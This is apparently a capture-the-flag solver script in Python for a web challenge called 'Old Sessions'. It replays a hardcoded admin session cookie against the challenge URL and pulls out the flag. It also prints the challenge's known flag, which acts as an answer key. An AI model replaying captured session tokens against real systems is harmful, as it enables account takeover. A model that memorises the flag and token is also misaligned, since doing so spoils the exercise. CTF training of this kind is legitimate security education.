#!/usr/bin/env python3
"""
Solver for Challenge 739: Old Sessions (Web Exploitation)
Exploits infinite session expiration and admin session token disclosure at /sessions.
"""
import urllib.request
import re

def solve(base_url, admin_session='Zuz0UQxb7YI43MSfvuqU5xIjlbdIz21QQgkbllKPYR4'):
    req = urllib.request.Request(
        base_url,
        headers={'Cookie': f'session={admin_session}'}
    )
    with urllib.request.urlopen(req) as resp:
        html = resp.read().decode()
    m = re.search(r'academy{[^}]+}', html)
    return m.group(0) if m else html

if __name__ == '__main__':
    import sys
    if len(sys.argv) < 2:
        print('Known Flag: academy{s3t_s3ss10n_3xp1rat10n5_3fdcb5e2}')
    else:
        print('Flag:', solve(sys.argv[1]))
